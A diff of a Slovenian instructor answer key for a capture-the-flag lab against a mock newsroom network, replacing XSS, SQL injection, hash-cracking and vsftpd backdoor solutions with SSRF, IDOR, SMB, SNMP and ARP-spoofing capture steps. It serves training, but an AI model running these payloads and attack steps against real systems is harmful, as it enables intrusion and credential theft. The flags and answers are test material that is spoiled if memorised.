@@ -2,29 +2,33 @@
 
 Ta dokument je odgovor in walkthrough za inštruktorja. Ne delite ga udeležencem pred zaključkom laboratorija.
 
-## Vse Zastavice
+## Vse zastavice
 
 | Naloga | Odgovor |
 |---:|---|
 | 1.1 | `10.10.20.0/24` |
-| 2.1 | `5` |
+| 2.1 | `7` |
 | 3.1 | `10.10.20.11` |
-| 4.1 | `NP-CTF{STORED_XSS_IN_NEWSROOM}` |
-| 5.1 | `NP-CTF{EMPLOYEE_DB_LEAK_2026}` |
-| 6.1 | `e98b57dad8ff20a3c286da82b5e730f659d0b75e7bff31b245530b812f8ea901` |
-| 7.1 | `Novice2026!` |
-| 8.1 | `NP-CTF{ANONYMOUS_NEWSROOM_FTP}` |
-| 9.1 | `NP-CTF{MAILBOX_COMPROMISED_2026}` |
-| 10.1 | `CVE-2011-2523` |
-| 11.1 | `NP-CTF{VSFTPD_BACKDOOR_NEWS_ARCHIVE}` |
-| 12.1 | `NP-CTF{UNPUBLISHED_DRAFTS_EXFILTRATED}` |
+| 4.1 | `NP2-CTF{EXPOSED_DEPLOY_BACKUP}` |
+| 5.1 | `NP2-CTF{OLD_PROXY_CONFIG_LEAK}` |
+| 6.1 | `NP2-CTF{IDOR_UNPUBLISHED_PRESS_PASS}` |
+| 7.1 | `NP2-CTF{SSRF_REACHED_INTERNAL_API}` |
+| 8.1 | `NP2-CTF{SMB_PUBLIC_SHARE_EXPOSED}` |
+| 9.1 | `NP2-CTF{SMB_EDITORIAL_SHARE_LEAK}` |
+| 10.1 | `NP2-CTF{SMB_DROPBOX_WRITE_CONFIRMED}` |
+| 11.1 | `NP2-CTF{BROKEN_ACCESS_CONTROL_DRAFT}` |
+| 12.1 | `NP2-CTF{SNMP_PUBLIC_COMMUNITY}` |
+| 13.1 | `NP2-CTF{CLEARTEXT_HTTP_SESSION_CAPTURED}` |
+| 14.1 | `NP2-CTF{SCAPY_CUSTOM_PROBE}` |
+| 15.1 | `NP2-CTF{REPORT_READY_FOR_EDITORIAL_BOARD}` |
 
-## 1-3: Odkrivanje Omrežja In Portala
+## 1-3: Odkrivanje omrežja in portala
 
 ```bash
+mkdir -p scans
 nmap -sn 10.10.0.0/16
 nmap -sn 10.10.20.0/24
-nmap -sC -sV -p- 10.10.20.0/24
+nmap -sC -sV -p- 10.10.20.0/24 -oA scans/news2-full
 ```
 
 Pričakovani aktivni IP naslovi:
@@ -33,270 +37,284 @@ Pričakovani aktivni IP naslovi:
 10.10.20.1
 10.10.20.11
 10.10.20.21
-10.10.20.41
-10.10.20.51
+10.10.20.31
+10.10.20.61
+10.10.20.71
+10.10.20.81
 ```
 
-Portal je na:
+Javni portal:
 
 ```bash
 curl http://10.10.20.11/
 ```
 
-## 4: Stored XSS
-
-Odpri katerikoli članek, na primer:
+## 4-5: Spletni pregled in izpostavljene konfiguracije
 
 ```bash
-curl http://10.10.20.11/article.php?id=1
+nikto -h http://10.10.20.11
+curl -i http://10.10.20.11/
+curl http://10.10.20.11/robots.txt
+curl http://10.10.20.11/backup/
+curl http://10.10.20.11/backup/deploy.env.bak
+curl http://10.10.20.11/backup/nginx-old.conf.bak
 ```
 
-V obrazec za komentar oddaj payload:
+Uporabni izsledki:
 
-```html
-<script>document.body.innerHTML += "<h2>"+window.NP_XSS_FLAG+"</h2>"</script>
-```
+- manjkata `X-Frame-Options` in `X-Content-Type-Options`
+- `/backup/` omogoča indeksiranje
+- konfiguracijske kopije so neposredno prenosljive
 
-CLI primer:
-
-```bash
-curl -X POST http://10.10.20.11/comment.php \
-  --data-urlencode 'article_id=1' \
-  --data-urlencode 'author_name=student' \
-  --data-urlencode 'body=<script>document.body.innerHTML += "<h2>"+window.NP_XSS_FLAG+"</h2>"</script>'
-```
-
-Nato odpri uredniški pregled:
-
-```bash
-curl http://10.10.20.11/moderator-review.php
-```
-
-V brskalniku se payload izvede in prikaže:
+Zastavici:
 
 ```text
-NP-CTF{STORED_XSS_IN_NEWSROOM}
+NP2-CTF{EXPOSED_DEPLOY_BACKUP}
+NP2-CTF{OLD_PROXY_CONFIG_LEAK}
 ```
 
-## 5-6: SQL Injection
+## 6: Nepravilen dostop do press pass zapisov
 
-HTML komentar v `search.php` pove, da backend vrača 5 stolpcev:
+Javni zapisi:
 
 ```bash
-curl 'http://10.10.20.11/search.php?q=test'
+curl 'http://10.10.20.11/press/pass.php?id=1001'
+curl 'http://10.10.20.11/press/pass.php?id=1002'
+curl 'http://10.10.20.11/press/pass.php?id=1003'
 ```
 
-Column discovery:
+Neobjavljen zapis:
 
 ```bash
-curl "http://10.10.20.11/search.php?q='%20ORDER%20BY%205--%20-"
-```
-
-Dump zaposlenih:
-
-```bash
-curl "http://10.10.20.11/search.php?q='%20UNION%20SELECT%20id,full_name,email,role,internal_flag%20FROM%20employees--%20-"
-```
-
-Uporaben payload:
-
-```sql
-' UNION SELECT id,full_name,email,role,internal_flag FROM employees-- -
-```
-
-Zastavica pri `matic.kovac`:
-
-```text
-NP-CTF{EMPLOYEE_DB_LEAK_2026}
-```
-
-Dump uporabnikov:
-
-```bash
-curl "http://10.10.20.11/search.php?q='%20UNION%20SELECT%20id,username,email,password_hash,password_hint%20FROM%20users--%20-"
-```
-
-Uporaben payload:
-
-```sql
-' UNION SELECT id,username,email,password_hash,password_hint FROM users-- -
-```
-
-Hash uporabnika `matic.kovac`:
-
-```text
-e98b57dad8ff20a3c286da82b5e730f659d0b75e7bff31b245530b812f8ea901
-```
-
-Namig je tudi v tabeli:
-
-```bash
-curl "http://10.10.20.11/search.php?q='%20UNION%20SELECT%20id,account,hash_type,hashcat_mode,additional_hint%20FROM%20password_policy_notes--%20-"
-```
-
-## 7: Hash Cracking
-
-Ustvari `hash.txt`:
-
-```bash
-printf '%s\n' 'e98b57dad8ff20a3c286da82b5e730f659d0b75e7bff31b245530b812f8ea901' > hash.txt
-```
-
-Majhen wordlist za učilnico:
-
-```bash
-cat > wordlist.txt <<'EOF'
-Slovenija2026!
-Svet2026!
-Politika2026!
-Gospodarstvo2026!
-Kronika2026!
-Sport2026!
-Šport2026!
-Kultura2026!
-Tehnologija2026!
-Vreme2026!
-Novice2026!
-EOF
-```
-
-Hashcat:
-
-```bash
-hashcat -m 1400 hash.txt wordlist.txt --potfile-disable
-hashcat -m 1400 hash.txt wordlist.txt --show --potfile-disable
-```
-
-John:
-
-```bash
-john --format=raw-sha256 --wordlist=wordlist.txt hash.txt
-john --format=raw-sha256 --show hash.txt
-```
-
-Plaintext:
-
-```text
-Novice2026!
-```
-
-## 8: Anonymous FTP
-
-```bash
-ftp 10.10.20.41
-```
-
-Prijava:
-
-```text
-Name: anonymous
-Password: anonymous
-```
-
-Ukazi:
-
-```text
-cd public
-ls
-get flag_ftp.txt
-quit
-```
-
-Alternativa:
-
-```bash
-curl ftp://anonymous:anonymous@10.10.20.41/public/flag_ftp.txt
+curl 'http://10.10.20.11/press/pass.php?id=9001'
 ```
 
 Zastavica:
 
 ```text
-NP-CTF{ANONYMOUS_NEWSROOM_FTP}
+NP2-CTF{IDOR_UNPUBLISHED_PRESS_PASS}
 ```
 
-## 9: IMAP Mailbox
+## 7: Predogled virov in doseganje notranje storitve
 
-Prijava:
-
-- username: `matic.kovac@novapress.local`
-- password: `Novice2026!`
-
-IMAP z `nc`:
+Iz izpostavljene konfiguracije je razviden notranji API na `10.10.20.61:8080`.
 
 ```bash
-nc 10.10.20.51 143
+curl 'http://10.10.20.11/tools/preview.php?url=http://10.10.20.61:8080/internal/status'
 ```
 
-Ukazi:
-
-```text
-a1 LOGIN matic.kovac@novapress.local Novice2026!
-a2 LIST "" "*"
-a3 SELECT INBOX
-a4 FETCH 1:* BODY[HEADER.FIELDS (SUBJECT FROM)]
-a5 FETCH 3 BODY[]
-a6 LOGOUT
-```
-
-Če vrstni red sporočil ni enak, poišči subject:
-
-```text
-Arhivska datoteka in notranja preiskava
-```
-
-Zastavica v telesu:
-
-```text
-NP-CTF{MAILBOX_COMPROMISED_2026}
-```
-
-## 10-12: vsftpd 2.3.4 Backdoor
-
-Banner:
+Neposreden ukaz iz istega segmenta:
 
 ```bash
-nc 10.10.20.41 21
+curl http://10.10.20.61:8080/internal/status
 ```
 
-Pričakovano:
+Zastavica:
 
 ```text
-220 (vsftpd 2.3.4)
+NP2-CTF{SSRF_REACHED_INTERNAL_API}
 ```
 
-CVE:
+## 8-10: SMB enumeracija in zapisljiv share
 
-```text
-CVE-2011-2523
-```
-
-Trigger backdoorja:
+Enumeracija:
 
 ```bash
-nc 10.10.20.41 21
+nmap -p139,445 --script smb-enum-shares,smb-enum-users 10.10.20.31
+enum4linux -a 10.10.20.31
+smbclient -L //10.10.20.31 -N
 ```
 
-Vpiši:
-
-```text
-USER test:)
-PASS test
-QUIT
-```
-
-Povezava na shell:
+Javna mapa:
 
 ```bash
-nc 10.10.20.41 6200
-id
-cat /root/flag_ftp_shell.txt
-cat /archive/unpublished-drafts-list.txt
-cat /root/drafts/unpublished-investigation.txt
+smbclient //10.10.20.31/public -N
+smb: \> ls
+smb: \> get flag_public_share.txt
+smb: \> quit
+cat flag_public_share.txt
 ```
 
-Zastavici:
+Uredniška mapa:
+
+```bash
+smbclient //10.10.20.31/editorial -N
+smb: \> ls
+smb: \> get flag_editorial_share.txt
+smb: \> get api_notes.txt
+smb: \> quit
+cat flag_editorial_share.txt
+```
+
+Preverjanje zapisljivosti:
+
+```bash
+printf 'student proof from lab\n' > student-proof.txt
+smbclient //10.10.20.31/dropbox -N
+smb: \> put student-proof.txt
+smb: \> ls
+smb: \> get README_UPLOADS.txt
+smb: \> quit
+cat README_UPLOADS.txt
+```
+
+Zastavice:
 
 ```text
-NP-CTF{VSFTPD_BACKDOOR_NEWS_ARCHIVE}
-NP-CTF{UNPUBLISHED_DRAFTS_EXFILTRATED}
+NP2-CTF{SMB_PUBLIC_SHARE_EXPOSED}
+NP2-CTF{SMB_EDITORIAL_SHARE_LEAK}
+NP2-CTF{SMB_DROPBOX_WRITE_CONFIRMED}
+```
+
+## 11: Uredniški API in zaupni osnutek
+
+API ključ je v `/backup/deploy.env.bak`.
+
+```bash
+curl -H 'X-API-Key: np2-api-key-preview-2026' \
+  http://10.10.20.61:8080/api/articles
+```
+
+Vidna sta samo običajna osnutka `2001` in `2002`:
+
+```bash
+curl -H 'X-API-Key: np2-api-key-preview-2026' \
+  http://10.10.20.61:8080/api/articles/2001
+curl -H 'X-API-Key: np2-api-key-preview-2026' \
+  http://10.10.20.61:8080/api/articles/2002
+```
+
+Neposreden dostop do zaupnega osnutka:
+
+```bash
+curl -H 'X-API-Key: np2-api-key-preview-2026' \
+  http://10.10.20.61:8080/api/articles/9009
+```
+
+Zastavica:
+
+```text
+NP2-CTF{BROKEN_ACCESS_CONTROL_DRAFT}
+```
+
+## 12: SNMP monitoring
+
+```bash
+nmap -sU -p161 --script snmp-info 10.10.20.81
+snmpwalk -v2c -c public 10.10.20.81
+snmpwalk -On -v2c -c public 10.10.20.81 1.3.6.1.4.1.8072.1.3.2
+```
+
+Zastavica:
+
+```text
+NP2-CTF{SNMP_PUBLIC_COMMUNITY}
+```
+
+## 13: Zajem nešifrirane HTTP seje
+
+Editor container vsakih 30 sekund obišče portal, pošlje prijavne podatke in nato obišče nadzorno ploščo.
+
+Osnovni zajem:
+
+```bash
+tcpdump -i <iface> -s 0 -w novapress.pcap host 10.10.20.71
+wireshark novapress.pcap
+```
+
+Filtri v Wiresharku:
+
+```text
+http.request
+http.cookie
+http contains "ana.zupan"
+http contains "Urednica2026!"
+http contains "NPSESSID"
+http contains "NP2-CTF"
+```
+
+Primer on-path zajema med delovno postajo in portalom:
+
+```bash
+ettercap -T -q -i <iface> --write mitm.pcap --mitm arp /10.10.20.71// /10.10.20.11//
+```
+
+Opcijsko tudi med delovno postajo in API:
+
+```bash
+ettercap -T -q -i <iface> --write mitm-api.pcap --mitm arp /10.10.20.71// /10.10.20.61//
+```
+
+Če delovna postaja udeleženca ni v istem Docker bridge segmentu, lahko inštruktor za razhroščevanje zažene helper:
+
+```bash
+docker compose --profile attacker up -d attacker-helper
+docker compose exec attacker-helper ip addr
+docker compose exec attacker-helper tcpdump -i eth0 -s 0 -w /tmp/novapress.pcap host 10.10.20.71
+```
+
+Zastavica je na strani:
+
+```bash
+curl -c c.txt -b c.txt -X POST http://10.10.20.11/login.php \
+  --data 'username=ana.zupan' \
+  --data 'password=Urednica2026!'
+curl -b c.txt http://10.10.20.11/editor/dashboard.php
+```
+
+Zastavica:
+
+```text
+NP2-CTF{CLEARTEXT_HTTP_SESSION_CAPTURED}
+```
+
+## 14: Custom probe s Scapyjem
+
+Najprej odkrij storitev:
+
+```bash
+nmap -sV -p8081 10.10.20.81
+nc 10.10.20.81 8081
+```
+
+Netcat kontrolni primer:
+
+```bash
+printf 'NP-PROBE:2026' | nc 10.10.20.81 8081
+```
+
+Scapy primer:
+
+```bash
+python3 - <<'PY'
+from scapy.all import Raw, raw
+import socket
+
+payload = raw(Raw(load=b"NP-PROBE:2026"))
+with socket.create_connection(("10.10.20.81", 8081), timeout=3) as s:
+    s.sendall(payload)
+    print(s.recv(4096).decode(errors="replace"))
+PY
+```
+
+Zastavica:
+
+```text
+NP2-CTF{SCAPY_CUSTOM_PROBE}
+```
+
+## 15: Povzetek poročila
+
+Minimalno poročilo naj vsebuje:
+
+- aktivne hoste in odprte porte
+- izpostavljene datoteke in konfiguracije
+- posledice dostopa do notranjih storitev
+- ugotovitve iz zajema prometa
+- priporočila: odstrani javne backup kopije, omeji predogled virov, popravi avtorizacijo objektov, zapri anonimne deljene mape, šifriraj prijavo, spremeni API ključ, omeji SNMP in uvedi pregled varnostnih glav
+
+Zaključna zastavica:
+
+```text
+NP2-CTF{REPORT_READY_FOR_EDITORIAL_BOARD}
 ```
